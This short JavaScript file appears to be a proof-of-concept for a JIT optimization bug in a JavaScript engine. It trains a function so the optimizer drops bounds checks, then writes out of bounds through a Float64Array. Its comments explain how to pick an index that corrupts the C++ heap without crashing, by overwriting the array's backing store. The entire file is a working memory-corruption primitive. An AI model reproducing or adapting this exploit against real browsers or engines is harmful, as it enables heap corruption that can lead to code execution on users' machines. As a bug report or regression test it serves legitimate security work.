var writable_address_range = 0x20000000;
var a = new Float64Array(writable_address_range);
var training = new Float64Array(10);
function write(a, index) {
	var offset = 0x20000000;
	for (var i = 0; i < 1; i++) {
  		a[index + offset] = 0xcc;
	}
}
// Trigger optimization of write().
for (var i = 0; i < 1000; i++) {
	write(training, -0x20000000);
	write(training, -0x20000000 + 1);
}
// Now write out of bounds until segfault.
// The initialization value for i can be freely chosen
// within [-0x20000000, -0x20000000 + writable_address_range].
// An interesting value is -2, which does not segfault on access
// but corrupts the C++ heap because it overwrites the
// Float64Array's backing store.
for (var i = -0x20000000; i < -0x20000000 + writable_address_range; i++) {
	write(a, i);
}

